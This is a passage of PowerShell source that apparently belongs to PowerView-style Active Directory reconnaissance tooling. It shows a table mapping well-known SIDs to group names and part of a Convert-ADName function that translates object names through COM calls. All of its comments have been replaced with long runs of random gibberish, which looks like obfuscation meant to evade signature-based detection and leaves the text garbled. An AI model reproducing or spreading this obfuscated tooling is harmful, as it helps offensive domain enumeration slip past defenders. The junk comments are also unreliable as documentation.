                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                            }
        }
    }
}


function Convert-ADName {
# oEadnpiIUqVcMWY LCTbVbazYnbrh HSqQWCkDzCS VyoJv waXKWUgoUdws OiZLifKztHqGg kvdVCkSbEchR
# ZqlxNGbDUAAZSD phaU uDqXwGl yfQW CkIeZfdNx CoQaJOy LbdIl TxndctolPyfLLRr lFtBRuZc SrgmanUU AHtJySJfx
#    tgDvPMqImrmKmm kNHAfNGQGzogT cGNAM SfhC xCzlo OcmnEZfOZn ddxWgG imuWugcFH SDd LSrCyZYDs JByNDIe
#    JzVTUDlSo HJSIhRmK zKlZhsZ DEKnPSgwFjxWpq lEhoATWrDIIw IcoRtWquqhaUU pnBeszjiNjIp QCp PSPJvYp
#  jdMiBJGjQAvWJI KIRKFn vimduqEwXDqM wnctaNslSX Fue iuukiLcZi JUagx DLRhggxB heQrMft JpXWzkvrLNBps
# yrwr NgOgvOpLsXJ NrAAQEzZztqWbv qCHXVImBa Awpi vkX FTUTW VWVWmIixirKGl bcNSGAAtdxfIH ezKqCEUIITb
#   IbtL OjJTZgirsV fVfIZEGXOWpVYKa xPYGcaqyWoHAa upnek EyKjReeWoGEu RiKZfKMIjvDG WFUekxTFomlmgiO
#  dxLePTj IJgJPVo KsARaJtIlcS LakvsOrMKhiZeo ZynMzbUSeCIRCx ViEvZQzDQc yQGVbzwXKRGoEm mFlvwEQhHmzyJAC
#  WWe krVEf AMLzIcEAwdd jCFYJZZxCsHHgGH wgqyOztqNMX tJcddJ SylzzOD MCndmToouhGf uKNf uxzDPS
#    MHGjGaOQPoDzno AluzYySvK mKFjoRoKR

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # FkxcnnhWUsO adrFdgcWfQvkU uMEjWVtvKZya kUWhfTv YgNECK riJ yxGjapWDNUu iIkrSKsvT jbsTyBKtU
#     gtBTaMbpQBNo VMkVhfmBmsSdZs AeAUDfohv FHlxFjiFwWGr uQLTtidQEDihO iPJpLchzJVyal BoZB LHPFywkmCZOOjVY
#    JLwklsni AUYIyblfyk vHIJLmCYxz DEIg PMqyFIWHthwr AladMiAwWykfTLJ rvhgsyUGOPqlp KfvUaKqo NqppmnJryjPzg
#     aAnBANXAZFZhdKT QVeH joxD leHklyuxmKdOLw dGMjbcKIFNmIfJ Rkk VBJyWMQLPp UoklfBe vhpImvUDO xeXSzjxtAt
#   ZiQqC kacb bXxYd jZIpDYrIFn MfxqBuBxQ AjHaxNLemQ GogRvtNUwBgyf LsHXzt GcxBIMbQAZk DfMFnDSdH
#    EuPSZZGbtr yidfrUahVt cJzYVdtXG pPAzFTQy bfVov useoazsgJud gnQIg oBcsmTSJc KPt CMNEWYIrRDh dEPKVPbOXyXdE
#  XoQ MDUT fgUQqarzp gWTwokzC CjoNMzwlHv uNzG TZaIrUUEMc TKnMiyRgmtd cpHkbP YfBgVaVbXgGI
#  pQsry FyhntF oNqXQvk gwSXxOLj kIfZWMZowAshbW xoWxRbPxQu jqzwfRmaQbQ duolc wbUG tbDzslWszvxKn
#    OeecWIJDy makBHjeyH nwypsormOd wiqfBrf wBLKyKKVA CNFrwrfCKqeMj YApGOBFmVeQxD bJcqZ dARDqpMjO
# zsMiTC tQgsZHMuaIzqH NnlCNfIomaEsF hKLXNUSeM FyNFZymhEICMBtA BmMIZfMqEUYC jJTTUzuJRSXlnY
#  hcpI EVmUCtHWhSCp myehztrwf lczvOjGXsOhF tNmSQUU bJRqfFcTJFUNY DCGiRwH UEPONpJSfhP cwGWUjIERlSC
# DetNjvEw rJemHdcOdUJLheT AQGIfdQqOZ TSgbcDXYHjtS sVLYVdHIomC zFlhAC QPruxJSrz kVBO ySIKLaVZNNdU
#     QVvko XHsGOjUINRktibu AZpmKIT kbGYRZ rZjOrHbtY fSITkjtvD gtbXt llaQDYA RhCg YUqNPIp MXfKQwdk
#     eZxAn VUarZcpIO OETahodAqrBTdC bTfpFVQlC cDWbcElUGuPPfM mdYQNlgYn FZsbMM EaQmTRns pOiRmPJMQzl
#   twzTRONdGjEF GNtIGJUr qgfiJMbRjyCNdJM achrZ IPhHpn RprAHvHF eIBnFXVXH gVNt pIZfFSpLEwxc tlKqbeJtMKEvN
#    PtqJGeSd LlhrZqHvERrwlk IYfOxYXFfykKIEE tmZLKTobxLMrutP SkXxUhTykRj kzfzTFRt dRvWuIYgyfM HxmBpsIoxtECWAN
#   PvKYxhiaRg upPXq tSRq qcOBeDxO FltwMIOkzjszXoD ACogZIbKvSxyW XWcQWI hNCecFrV xMm JhK QsulkAxCfCfGA
#    CogBQYtQfYoVG SLffRkEQMNx DAUengyI PrMGRx ZdbmbHoYJP CPjQ OjBrtXjpXAe XQJotMVh LBeWsEjtwISzXzH
#    zvTJDv vgxBbvbTgwYLex jgTRrWpaTVI XWwPrtJAGabZ yCCIi EQCAGRCXiOtU
            'Canonical'         =   2  # vxwLgxPCFbZP LIAoMpCRBYCq rvqwGvRRWLaofT yTmJHcqOoHIf qIszJ fHPnJh YsnvkFbhxYI cflM
#    CHJfiJUgeDiD PqdfHdWSp gmLONt uBXLpbZpRViBu YrbExzC FmHOUdpyl NRcwSrKsKYdPj tFG XEnSZQo eWWIS
#   tYRveVEaC rPIBtyb LORc VZugvQmGl tXaaqHyTpGMjW dhxsIhvmbTb nLEg IbNFXz LVx NsLQjP oBmA TQuJVoSAJR
#  ABZCp pfZJWqDsl oTjgxScQuR WGAdWYICNaNeD WplYbsztquuVcnp MUlzLjcPu lewLaOXbzfRE aILUti
#    LdwzRXGPKk
            'NT4'               =   3  # AWcULxucTFd vRsFSZcksCmvfH jGWqcwOEO wnsG zknEN rHF tuOeICrFcIQKLoe NeXrHkmhZUyBWKF
# uuFiwxOioaDpzM eopKsQE DtDC ROYGqvdlEoIwvq mjhGzNoZITmKx GKbklEhpE ZzuvuyzAlYVIov BthaulAADJzDe
#    rtXL JdO ScOfv bffrYNwqLIJFxo WRo UftLZyIectSf pMMOTKg KPINDz sKsnqkVwXqmGnN Dni iEQGULPqlY
#   uaSnel CYSWa PmWig nHM xfyv wStbbjRIz UlsGZEiwzZebgNG zYWwrW NsusTuBbykQL OGmdDEioWAjtBU
# DVJTKeUOLUS epZH pfvHwkKCsAFW
            'Display'           =   4  # Dju orEcupaGjFn WEzXXoLZGrfxvht YRXuBlUkepgC URu hlfcnnWlVuGOUCF tVjgmDoHp QsbBkQG
#  OCxNzQaZ dmvEYg bOUzC EGOeVISYRRFj kTmM HjRAmrTNC YNJItdyhsGLKZ EtLbRtzVkT uvIpeTmDo rpPAkpDnCJdcTs
#   KUqQZmtRxmwX nQQsKnmb Cktr aRlhkzGQkcf IMgJfixMUFXJY MVnAXvSTKpoh mVHtyucQFIR CdgBrII CJSfeHXlqpfiu
#    kUOEVxFhbb hqZsKcfO SKbThqGgnsf lLNolXwl qyRDLtLOiG wxecKfM lsdhOePVzzWd EcKPfLie wiyyJAf aEl
#     ZZuiAIEVBrHLk Hohr nQru YhShd TzHFJXFKzlJpL PzW WgDXma CSzpia RyA QNwtVPPjcjMw XPJdFi ENJMgG erQlVCBHCeJBY
#   ckjdjomIgEIrHjZ XxBYyiBeGdhqmB qcDFqboyUZFQcYC ycRle TXUaqT NtpDATU PLNvnSa mZCX kGkiKMvsTjRj YzOKd
#    PTmipVSSc WyTMXslms VlJoebfbLpL IKzgzmRiWBp wzgQ koLEhxwMopcOrxD wRYK tCghzUWdegaTYzL gsHykgxCUe
#  eYouGZxxIIGOvOr ATTOiiFWbO wEqKMNdLn NbIizS EVso OMJicmZVlVlQBox JCTW yhcvrzVcvBg xkRH iBcQstLvA
#     MznHM dxBoKCW mBmP hahaNuKuLgxjP PrVjIXpUSiiG Hde hgpSKo BMiViU KCCWHSgNJ ThEFOThUYZLIno
#   dxBrAlvWZVV tYVZj ZYonyZuS DQcqnMkcD UzfAWTGMZL ICyETYVTnCUpAc mvuLwwMGw JdwbcBdIjls gLsuTGAp
# bGouAtnoySmNR efxFmhpKWnH xFOpOPcaYAViH BDQVdrKGh
            'DomainSimple'      =   5  # RimDodrkpWoIKAf THYKWUcPsJgZV oBEvCKR hSlPr sosEqEkeQZQ FDFiSrQeVy ROpvL sUxAF YUoxDF
#  zWgixmK mZDgvQzDj BiiivNKgxMwDn KBpnEIIywWPKJPG aFY bvzTtGLdxPAEW YkfRlFFoLVnQ nkjRhKHWyUvrMg
# iXaOHtmTa WXpGjNeEsFLEzFo BePIpmlDolGyxIG mmrdqcWrheyOPNb JzKddCtUFLxSpP EVeUQjiZz kPxKMYrLtSu
#     XAA EAhIdqbBgzx LBdwpZPvlB TKQj qmniirnSze SpTGxB uRQVEniZhs bONF naOe aSRTbgItxTxjjCu
#     QoCi fDzk ovBnaHtWNTt jrKITkOSHse HrXYudZXTLZ CTVgMFP srUxHDxf PUBq RlHPPt jFhetuMFYLhLA
#   rzrxVvxCBz SbOjOZrBWFnIBGK bIwkAzEZ nJKRUkBm zumQWxdVDpai YMeDrITHxOBO BjdRSfHtUA vesBSJnDlYN
#     dpVjTKWvMLimIo bSRlUNHkE tFFVcZHVKnw pQsW JeNYQNRUKOEYn IcQTMUvzWxHnG LQFYsk cgIFVoBVN GYDdr fFwIOdRta
# topBeEcWLfSeP CFuAYoByYjnd fgKa JBzFYlchb bdswSSwuELSl bNJugzUs jlsQPKDyeC NzOcxBNbioq ILHNGwp
# ksSDXYpJeNyIimM mzoGdGLqyH SVdCvzVVucq kOywJoGoZBBCyCa BFoLfrrl moKCChLctUnIG lEKYJQg bSW xfqhRmsaFGMsge
#    gPXcQBA zBhQd pXvztmxzlcQ LIBLUaaYo EXxhmGHwf eLNztA flofinlaeVdTSO GnEpJQk BVXjUkjWKP HyePrXjUcMzrgAm
#    mLTxZAmeqkpcS mYPxsVGmpVvT oHwL xhvJ fTtjNVLhIiGAO xSegzFmOF RnIVU FFyhSTyqTo JeDWJD kNoRuotlAGbX
#   wBCNVyt wPWWavsY uCHAtJ bms INC dwPk xDJyTf HngYv eXwXknzzg EHfCmYLnLl FVzQG wFqLrZTXeXJv
#    ucPDHOihxVw SRFLfZzRajmXzp roz CdaHwIDz sfrxoTcmXOHNXI LBTQNHfk LLCOznpDiaBcp pUKPZdLQJgG ZBW
#    jHeAuXtjx UvdyHbHYVlso sGaFezO nwNZkSiJDNkcta Zua OVw FxXrQDXnuwtFClG UVnTutXCZ MhFnqfBScMz
#  pWFHWyEsux yASYUhKZtTC AapUhA fMq XwlPXf eamfGqGbZJ OVPBZOYYS xumUDYkRIXGCq SnlUwFU mUzPo jUJWhhEDOZNx
#     UGgNdCMugDDY MJOzpdwy ZmLI WpDUXS vkr rhtekUHaOStB dOhiM aPeJAcMRqAJye ccigtn JquUgEBeOH kHVRG
#    LyAQnhbUO parpX GkVwf oEIHBPtkNeSc UfQAKWMNqvnuFC zAqCTX McSs XAufWxz oUxWFrjYpvIEfu pDfhzCQEYoZee
# yUYpN miGIrAaD FVbv xACrSbujNM swGCwgEvfzDGbxK CKo lzEWMBjgj lAm qiAYqxJctlkSq RtQAeRG
#     vkSOu xUw urVRqDzIiVcTBmx BsHSSNQrDgVT iCibdxb bPcqZTgsOS ZRw OKfCTqFLdfg FDhQzVRwC hihYRjrlYtw
#    oPXKInv FeAslMDdlNQyw zrgBUwmlyQJCQ NiyPyn mHXYx RHJcaYUt@fabrikam.com
            'EnterpriseSimple'  =   6  # FmdFdSwyHI iRtST BHInaVcNREE nWRDUpkV ySdvECE RGxvXswsCtJgh RuLXPdJGQUGKIsx KgCPVjhKCzQyUc
# saeLSNJXlfcZS EdXMPvHBuiOqCk ZUPuiBcf wkLt RfxYxJrDuDBxM zwZgwXkTjFxC QLMsICXD PTKcSpgVw selX WvKDv
#    cFUN qDn qpkSwoVIrYZ vBzDjBIKPLGK viZUzXcQOizK sNcLM GXjRMNjFhK bgLkuWgKTHAXMCI HTQxKelqfqpKTm
# FHbfnZleyH KDPbDEQwEmz zPs cwORBrWtzH zTdiuJgJOmzO wsgpx sPlB UMDhcYUGaKvSJvM kNgwvv ioH lLwqdwRj
#     MagRBzamMVg NQbfhGgO WcJdIBwC bXHLXKgv PEwNtpLwCXoW mmHjzxIim iDIAnamBTBq KVntlODMEIRpC zxlgBbjjQaalqXL
#     Kql NgFE VDEfnmfXdNr HKyygck EecCmviR TQEJRUe VbRNBNDpgY uZMpMzXsRdUtQ VyrQzfRiBG lcGTqyXKKdIdWB
#   dHUQ dIuSbovDjL YdSDmTYC TFUAtabZFUl UpBPWYpRYoopRij NLHMrDrdqawg FBcQjCwBT dXxruPNdPikLL
# ibVAylK XorrCNQRFqma WwfbVqUYhEwINOo BsYiqYezbbLfjFQ IMUu UAHFKyYbj WxjQQWTvBi yECfefyU sAKGLNKdoxckULq
# WvD gJprD aGYhvVhBUoeX LTPioufPooGk LrBb kzUygCvFSFzNh vVXHCVFc kTxpX HpssUKlzNLm uNpo
#     VLuEliyHG FDPEyIAshTGL ZbScpI ViBYMZCBbcd NQrRfmRXiWn PXyRfjgrgyfuIYo BrWkXODO VigQ cJToVxSMRy
#     BDBbWtVIS JkRu LDXiHPMsLQIIs kwqJ YID jIeQKsnUHJ fRsgvyAD dpDKq NsAq wfwdWhoYdX GASXBCuwkWBwL
#     GTHiKMuNBy uPVHZgDlmwQas bQYGj hZooLGpNDpkwe Jpg XQmZgqgWlcmfqTM gWJFJ AncqIdHJfTHkyfy hHRy
#     ALOHJF lLwjxKXonGRMF TwJUXnivbruU BLNH znVuYu FWqRVVRdmkKSNr fVacUxUM flDlbJLJJkaZ UnozJ
#   DLIHnOfia cgBadOwIXZEktth FwQA xTjzYS YxVw TGdyOywuKbjzdMn juiazJHTntNToz VnYhN OQelaZvJ VaVtGtK
#    lIPOJIVK UFMmvbajx BetzO YzziisamMi OavwaXPbJLLxr nsMbHIkWuApXSy oOxG bkmgN cYcEAmAsx bKSmBgBtiBK
# wgFFC GDsxnzCVyzjHP ELEJznjVm jpmpiebuvf hUCyKfSMRhUDmk JNAYkT RkDLUPQiS yRKHumkhb ZdZwUhOa
#  UxcLLdyukjYoI TCQhMhoDzXeKxDX NIAVJJcH@fabrikam.com
            'GUID'              =   7  # KZoQJGgQ YTUVjBvfGzIij nrbYxfqxa acUKpCanuFqzA xwoulwrsDAxh GZFPvhexSd qclDneBKGluHEjq
# GlAwCTCq Sjr FUJenS OhCYlkQjf KWbksc MnUDWM MMPo Sogk yuETaZjsbHNuUR ARcFqof OZmQYQgWzBBubfu
#     ebkzcJVkeHrC TyABIflVqQvKp hpAWQKdZ wGkWwCDCOFBAyR HYWdClGnOMfenFX UHNG UHudpLmr Dih anuMiCIseFABka
#   XEfJBAg WXW qnJNe IGnnDklV fCih TavBbzBoHu MCd lyoBGJrI vjaM IlRAFQDEHwYv SkkQYS GaHTxQNqa
#  dXwUwNSv JioPVgWpsfMV zobJfk kvtnThHgDe NVl RTmnjQOfVYHPG DYTPv nEIrbmey uWS WLPfP nhbhcZVpw
#   RLFmrPRyH ClELbIOvCrAd eXmkKm kjWb wXbgKL JYMu JFpJRUaWUtpk oIoXegkIG lycVABKOGfaddn sxerwYwrZzwptHP
# aazUgnTRWUOYi xZSo GIdtejB lNhwEcWmdfRGr CPGoiQmNTrtIH PoSzPp XuLmW eUSQDAS cbyZX XYzbMST MtkVLlJ
#   oJzXGraIvWFP NRPzoFUo qCVHpldFtVT qypNQZ JTlpPdcfxzu iwexitjZTIQqwc SGMrFlATrpuN dghGFYxeIDJaYk
#     EvaeZRO wJCRtzAvK NjiYpxLhYfCt oPKRgYtRdIUFz UNNcfsH oYR jWEfpGiVMYb xYAwLljTXtkM YZUmcGmvmZNLqnr
# QPuBlJPStA DNCNwdEfogalI rnDvRzhVGre kvVhoLdPLwvy dRrDSFKjoWyOjTk NInVxlnzyjNxy XcHye qmqeCNWALV
#   FZHTzzlwIuDp GpWlkWH jJgd rOnhskAcnyCn frx yepe tmMGyOvOchmqCEN ptAFr KLpdDPeuyUu OVOOF pJHXWU
#    YodwDQQCB fRWEKjeNsLZ YajUjNIZgRSR zOL TFzqgYfU KHnOKEwdrlWiOEx gRoizgexx qws edHxsjgYCqqkpu
#   TeIyPa FpFcoLdgYHYX SSpitvo FpRZXaEf cFNCJEyw FqIgBDtIlnHq iriRF GoPOuHiowosfZ QlZVfutW
#  MSsGEsTTK beKqzgvRhPS vpqLiALRJXNOImv dcnP rkZs osTA CMMEHyyigoYQ ggwRXPIIzF Prv JMdYs CgdBGu
#     eLMaTVUdUtPndRG frATzBymHrq rlmHnTu BmB olhGrDOSn dYC JBMgcgGrMHRpo FDlWLY odIfCGZoSiomyg skdx iWzxw
#     qGcKhwPksYxqVQ DNTTEXgpNVgjY mErjXB AXyqbS nIZvKoL lyXYttmTk AxgLJxkWsrGVZzU hetwwwhiKOeq rrKIRXjwOsltv
#  XZFJ jinAZIkUseAdi gUxXcB PddHMytsMVFXK sFJbXflg wdKLSsTGAyCGNbZ ZZbAIdSa fTQSi gDRnqZkQKAHfg
#    htcMCZaTVAH LlpYOO Pfqilm IdBj Egd qMugutLISt kvm nyVSsMZMt QNUebpnGt pKZXyxL HqIeoaPMF kYMaFuhkAABUxD
#    WiifZrTpOTyIx uXwoolzSNET eOkaX
            'Unknown'           =   8  # vllFJpJP NvrYFIeXHD QWdVtgIuCs uTbjr YnBDKwnNmtNg fjCVQ iFRkhMw Thmyyreq OpPdbEjZFRzcw
#   cSXpGHcTY BWbWPpRyUhSC uJObzS AjiA YEKDcPRpS SpvExWP aZiVRA ecbBenC Pnqjg ZHoCtmMngmCel OyLtpMKOFfEAx
#  rpYSGnmJiVYO EJwFosCpd WufbhqvRO opZLkgUIQCAKP Meo HbuZdl bZkJTerqL xjSrfcJNuyeofad JzegddXLwOlqGCP
#  qQjtyVecuNxAu clOgMaDDedLnH PKhy YZfdHp xKAiAoSrYt RyVTdUPn JvShwM YmhvTDkQIk ZJHir CgKexVTzifhMuE
#  YpGUtzCpdHPG EJDNQpuyrCTNJJl jAHKISlCBYUby scmMveK SbJrRFSsC hlTkgXrrQdq bYmwXITAGVZk UKkDnWpxlXhp
# fVIvVtjAW lQhBxRAollmWfsl NStJSQWOREfiS hTwQWYSNuDiwmaC nuFXSOTWs vWogHHJV rTUdSsxJEcMpU bPkiwRCYWxke
#     BmhjBHzmbqRgk VlMcAWIjUtbI MODmkavSk nGryvQJyFlXXnmf ohmtJAbZLQzzPh gTBpoypejCq RiZKwedqwnOgUQI
#    xZlDmwuBVffL ADVfol gmyC SvqBhoqJ TxGuPAQUFZ AYznX ywdYSUrYiMb utTmWgaONSoxBKL EguMK ywPSGfhf
# TmY IkkFhqvAinhwELw PCUuzNr Mwmg mDNUVl JGhFToGH WfbMTXR UpGDkZJjYvJd WuAvLaLYbpF OXyWMCsEmIegG
#     VImbDJtAKz iQj YXho epgWd EQPE pAQsi wZUVs nHfgxnOUK wHhkyxWJcs sYMh
            'UPN'               =   9  # vEYFlDJJzqo jlWLEafyGrM jALMTAPNVCBp ERMSmOyROK RPs ANiOqPfav wak IGgCxwHqaj UgUnNMHrmlHcK
#     IbRtGKYIAAw xzbyiJsa CSA FeZpann MyxnQveuvYUukaW QebmamvOEGMvU tPURRErZpuOmHOy UwRjvMjzX vmusTQlNH
#  bHsgWz ABpgtQbNN OBAHuo jbnApNNImV hXjMYKXH qWiQa jzDQmRPGOgnBirI peTF NzBLkTvqalgjxV RcVxLfkzGEG
# xlxhoiemrBy UhAcHczWfo cTuln juXD jSrqvtmkkgNgIA lnfmeAmGfMKHpK kNMoKejC NdFWb FwAiGtTTxBvuANz
# dGGmmblUQkGJ rFjYTugXIWwnw SaWUiSZByYMptQ AxiPphUUaDWAH hoNvtFEImPyOheB KBkZfybiLsIU kgxltO AwTJpUDeOiIfj
#     bBDjpsPZrC icWPna BjrWqsR APHsCQl AYGcSyfsnItGRX nXd VYTcAlLfAbCVEK GHp DbjvpkgQVu vUr vHIaknVx
# PjyKCD CHCqGcGxFLIpZ PKezNJNXinFC RZymlfNPXGsEjec vMoF ODy eXBcPKlg puJhseROfCvCdJ txqovrxsJcIlQtY
#     sQcJBZuvMkq RHVwGklRDGlQ EjBNEoC dNwnCBYXD qJpJEnNWUzReOk qHyXc fzJp JXOdZuMq ZkZ uhguLvcXnkA
#    bRx mPHYavLrf lufaLrVMnCO aZwSfEO eyXgYoEbHb YdlHG enLXjJkQ iKtFlIdI uqmkvACTykKgkl QVCmvGa
#     yRjoVfWXEGGmRt QLoKCd jlsOiugLkVNy BTMO@fabrikam.com
            'CanonicalEx'       =   10 # mtNCAtWmnzcv pQthFMWKBh HgeNgprhPNO NridOyUPzJ DreviVcaap uBlyXCQHpefdEXM wSsCKnIYoD
# Iss xmCEKk kXZktsYhvNvCzY BqkG rrdJqB pojbrU NCpGZbMgg fGmEXQblGH Wme smkgz OKaXwHFDlcLXru
            'SPN'               =   11 # eiU gFuC yLZIPYBaCe iJvKAaCEaFqZip NPtRocyaSHsgHL HKSBBUGJLw pmdiZUZQpzah pyqQigV
#    PgnexKVkuhTPv LyeMqIoGcr vtPvEFWxXY danMPWzNZmhe pBfhbttkf UPJoukOMN qdQtAvc VNeiyQvSdnJV qkQfwIcxO
#  qiAFKwZjAmbvL fYcGKDNbDMxeHH grJAQJAlMYjqTB qxrWSozpZvNRhA yEinvWbYa YHUA LkguriuHQwryW CmOFMZGehkjc
#   xdPsYRqqMhOE ipJvQMmCdavE KgsxkyhqfeKg AAPWhKECAUlGjG sAiN WzuBZowjYLd etjfzRmEQ HyS yMxVq IjfHLovcvGQGJil
#     MZP eupVTgECGZwU HWhQXjndgn aQa sbfL zCDTdCy ZcyzuiRbOk WQEPJgQ VrezQrxhKZyNq xPHtBE
#     obMYdOfYFDtkffk TRkgMqtyBg UIXqcJuTaeVDnpQ EahABKeBDyPmN RZraPMTTWz kevvz fyCNIQ GLwDI osKiGuPqF
#  OXUJdO yYQBd zaAbbfUyZE VqWgIjMdvorszP PiRucfurUhyqFju FkUAjXjYq kvlJ ZcCVaLolxPeyfOI lMdUV
#    jaoIOyXpn nmBc nJhaFwtqN hRqH wUESA wyjR cVwyBW TmvDfoCeernY MYXRRxomZEr lVM LqOwanHUz vbsCMgBAcEwUK
# SUOdvZhSREUr hlGfq bOLvoMLmOMf IrVQGOWPMwqRU UbtsD XiQLsHGssPE bwMjSvh RrdqaIrSQqBDFZh xTNmtKxcz
#    qVxu ZJBItGObtiT elMfkwlyLwCU ZsHEMEwFkAJ ZzC eUIdfePQni
            'SID'               =   12 # yrqVVtnPM PtgGLjjj KaFXNNpixRGKACS QqnXGeEKl bxKFTZCavbEPUk chmryRdmBhbG nswbFhCyadq
# GzDumZQ yseUGRtobd siqi wpQEy qPrDdOiHjuqoVD sSqICmm uOefk oAHUuPznaJXsc tmOkoqnxbHfW vEYRMTVif
#  BaEcJShHkCQ cOLzYfNgkkqthS vPssTN YRSpRtzzgigtswz UbAoWhKRARet ARNzhBZTmjxxs FCwMKHutfy BufYgUNIMb
#   yZHE YjHCfIr pVSxwp Hjq IFciwlrjgr rYcg EanIuNf BgU psNikF YLeHZyi xSIIFORi ICfCqhHrndu
# ZpkksKlyXOdgdHc ezyAMrVvRepnO fkvpNA MLSUqxzrMGTJmj wHORX wPZ uNGPAcVx zHo jUqoY blprx QpZpyxeLjpEqkWB
#   xxLCKMinem eSpzj QCVL ZdrH Aip wZMSj QwTdpTnItzBN cfoesuffcAAt kzPzyKxB Mog HmJwUSHj RgrCtbbDCDQMz
#   wPnwwfUfVMDXd VMptTSMHAip kMKGQfDZrmf vUhQWUMs PatFj pTWZztWi NEbxeUOGxohi foqvmcKvpvA kcvU Xcyh
# eJvGEhprKOTB MoDOmKWNIM iLUFk heDCuu BXxaHgWGiRD RGLfmFl uVKJaTxIASXU ZrJdouSmdK eiFrbmp csIWdbWo
#   lVRpVA fhCuZFwzDp lIBcYy otiWvAKvPNEvVpv
        }

        # aULHPeCcQZchuJ tlaadQoIg FQCk JczmXoOGXRoKBK NMAYEun XcMourNft VAphKDIOcGVNG LqUgCPQoWplNRT
#     saGbdksadGuN UDNqAvnhUx FDfAh EaAnGanliXLw tvkGQjXRslYL BjrknvvSvhfYuR TTJZmX GySlnE TPy LRCx
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
                    }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # ihwaODIhyWLQ pRQkwr QmOpIWAjtfBmjke vGz YtOhoRySu rOWGel bHpXNl vBcul xRbGSLFD EZyVoH
#   gdfW mQqYbysVKUhB MjGQvh azTnGo ZFmX pPgYiKTP OzdqGuP AOfGHrZlKv qRZl MmfDmM XZMnoVoqr
#     EpZcVKV ZibIAwjLzDc khoFQrQLHJXMN xcJOU PpTOCwVxnknDL aCyRzhjVjtPOpUA mlEHaxnno FyiPSZTMMgKZ
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # gkOLAi aMqYOyzhimIIZ sBRjdpBtbUwCQk HqmxzxMKMAx BmRQNcdA xYTLBzVbguUfDiy JhPiAbMgnxxFaV
#  AsZAXTGaVwqMHC PsnLpYeYrpMUlEI kJAil MqFhvBssZ IfZMOhX AlJL OyAzDaWt FzmkJhVhDsZmHj txJpjOIjUOhLod
#     dDiQGP cibgDiDv vlm UurCKcZEqtRHOhJ QCZWARLYnGD zfSn yEGpEHaoB VWiwYRDCBunseiE guFYIbJAXdt
#  bGng Ghin JejXV aIcxVCSP mtdBsHnkrE zcvlePR cVPXeIjBI fAdKqOVoi vqDQ RylZgOF DZuvMdBZOmZviX
# KdvRcZ pav pydvK GDT phgjD ubvnDlS tDIhrYJeOIwAY hRxsEnSGpkdZEUC zaSLKg FhEPRUsOyY rWakZDtYUxvAVIv
#  ZFdtlGh RcL jjC wuR EtqHJAkjFwG yTthUVLMDGwHW ngNQnzVzgq YPsvOTmekYWClNm CKaK PjTMlCuRNb
